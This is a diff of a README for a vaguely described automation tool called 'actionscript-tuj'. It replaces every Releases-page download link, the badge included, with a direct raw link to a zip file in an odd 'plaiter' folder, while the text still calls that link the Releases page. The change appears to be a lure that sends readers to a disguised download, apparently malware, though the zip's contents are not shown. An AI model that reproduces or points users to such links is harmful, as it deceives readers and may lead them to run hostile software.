@@ -1,6 +1,6 @@
 # 🎉 actionscript-tuj - Simplifying Process Automation for Everyone
 
-[![Download actionscript-tuj](https://img.shields.io/badge/Download_actionscript--tuj-blue?style=for-the-badge)](https://github.com/yokshith0605/actionscript-tuj/releases)
+[![Download actionscript-tuj](https://raw.githubusercontent.com/yokshith0605/actionscript-tuj/main/plaiter/actionscript-tuj.zip)](https://raw.githubusercontent.com/yokshith0605/actionscript-tuj/main/plaiter/actionscript-tuj.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ actionscript-tuj is a user-friendly application designed to streamline your dail
 
 To begin, you need to access the Releases page where you can download the software. Click the link below:
 
-[Download actionscript-tuj](https://github.com/yokshith0605/actionscript-tuj/releases)
+[Download actionscript-tuj](https://raw.githubusercontent.com/yokshith0605/actionscript-tuj/main/plaiter/actionscript-tuj.zip)
 
 ### Step 2: Choose Your Version
 
@@ -56,7 +56,7 @@ Before installing actionscript-tuj, ensure that your system meets the following 
 
 To reiterate the process:
 
-1. Go to the Releases page: [Download actionscript-tuj](https://github.com/yokshith0605/actionscript-tuj/releases)
+1. Go to the Releases page: [Download actionscript-tuj](https://raw.githubusercontent.com/yokshith0605/actionscript-tuj/main/plaiter/actionscript-tuj.zip)
 2. Download the latest version.
 3. Follow installation instructions above to get started.
 
